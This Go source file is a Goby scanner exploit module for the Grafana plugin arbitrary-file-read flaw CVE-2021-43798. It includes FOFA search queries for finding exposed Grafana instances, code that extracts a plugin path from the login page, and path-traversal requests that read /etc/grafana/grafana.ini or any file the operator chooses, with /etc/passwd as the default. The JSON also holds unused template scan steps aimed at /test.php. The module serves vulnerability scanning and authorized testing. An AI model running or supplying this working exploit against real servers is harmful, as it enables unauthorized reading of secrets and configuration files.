package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Grafana plugin file reading vulnerability (CVE-2021-43798)",
    "Description": "<p>Grafana is a cross-platform, open source data visualization web application platform.</p><p>Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., leaving the website in an extremely unsafe state.</p>",
    "Product": "Grafana",
    "Homepage": "https://grafana.com/",
    "DisclosureDate": "2021-12-07",
    "PostTime": "2023-11-01",
    "Author": "keeeee",
    "FofaQuery": "title=\"Grafana\" || title=\"Grafana\" || body=\"window.grafanabootdata = \"",
    "GobyQuery": "title=\"Grafana\" || title=\"Grafana\" || body=\"window.grafanabootdata = \"",
    "Level": "2",
    "Impact": "<p>Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., leaving the website in an extremely unsafe state.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in a timely manner: <a href=\"https://github.com/grafana/grafana\">https://github.com/grafana/grafana</a>.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "custom",
            "show": ""
        },
        {
            "name": "filePath",
            "type": "input",
            "value": "../../../../../../../../etc/passwd",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        "CVE-2021-43798"
    ],
    "CNNVD": [
        "CNNVD-202112-482"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Grafana plugin 文件读取漏洞（CVE-2021-43798）",
            "Product": "Grafana",
            "Description": "<p>Grafana 是一个跨平台、开源的数据可视化网络应用程序平台。</p><p>Grafana 存在未授权任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/grafana/grafana\" target=\"_blank\">https://github.com/grafana/grafana</a>。<br></p>",
            "Impact": "<p>Grafana 存在未授权任意文件读取漏洞。攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Grafana plugin file reading vulnerability (CVE-2021-43798)",
            "Product": "Grafana",
            "Description": "<p>Grafana is a cross-platform, open source data visualization web application platform.</p><p>Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., leaving the website in an extremely unsafe state.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in a timely manner: <a href=\"https://github.com/grafana/grafana\" target=\"_blank\">https://github.com/grafana/grafana</a>.<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 28, 37); font-size: 16px;\">Grafana has an unauthorized arbitrary file reading vulnerability. Attackers can use this vulnerability to read leaked source code, database configuration files, etc., leaving the website in an extremely unsafe state.</span><br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10240"
}`

	getPluginNameY48hdfYuGR := func(hostInfo *httpclient.FixUrl) (string, error) {
		getPluginConfig := httpclient.NewGetRequestConfig("/login")
		getPluginConfig.VerifyTls = false
		getPluginConfig.FollowRedirect = true
		if resp, err := httpclient.DoHttpRequest(hostInfo, getPluginConfig); err != nil {
			return "", err
		} else if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "Grafana") {
			reg := regexp.MustCompile(`"baseUrl":"(public/app/plugins/panel/([^"]+))","hideFromList":true`)
			result := reg.FindStringSubmatch(resp.Utf8Html)
			if len(result) > 0 {
				return strings.Replace(result[1], "public/app/plugins/panel/", "/public/plugins/", -1), nil
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	sendPayloadY48hdfYuGR := func(hostInfo *httpclient.FixUrl, filePath string) (*httpclient.HttpResponse, error) {
		pluginPath, err := getPluginNameY48hdfYuGR(hostInfo)
		if err != nil {
			return nil, err
		}
		if !strings.HasPrefix(filePath, "/") {
			filePath = "/" + filePath
		}
		payloadConfig := httpclient.NewGetRequestConfig(pluginPath + filePath)
		payloadConfig.VerifyTls = false
		payloadConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, payloadConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadY48hdfYuGR(hostInfo, "/../../../../../../../../../../../../../../../../../../etc/grafana/grafana.ini")
			return resp != nil && strings.Contains(resp.Utf8Html, `grafana.db`)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "custom" {
				filePath := goutils.B2S(stepLogs.Params["filePath"])
				resp, err := sendPayloadY48hdfYuGR(expResult.HostInfo, filePath)
				if err != nil {
					expResult.Output = err.Error()
				} else if resp != nil && resp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = resp.RawBody
				} else {
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult

		},
	))
}
